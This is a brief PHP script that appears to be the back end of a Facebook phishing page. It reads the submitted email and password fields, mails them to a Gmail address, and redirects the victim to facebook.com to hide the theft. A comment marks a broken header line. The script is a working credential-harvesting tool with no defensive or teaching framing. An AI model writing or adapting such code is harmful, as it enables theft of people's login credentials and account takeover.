<?php

$to      = 'melkamudagne19@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$header2 = "From:abc@somedomain.com \r\n";
$header2 = "Cc:afgh@somedomain.com \r\n";
//       ^ BROKEN concatenate
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "Content-type: text/html\r\n";

mail($to, $subject, $message,$header2);


$newURL = "https://www.facebook.com";
header('Location: '.$newURL);
?>
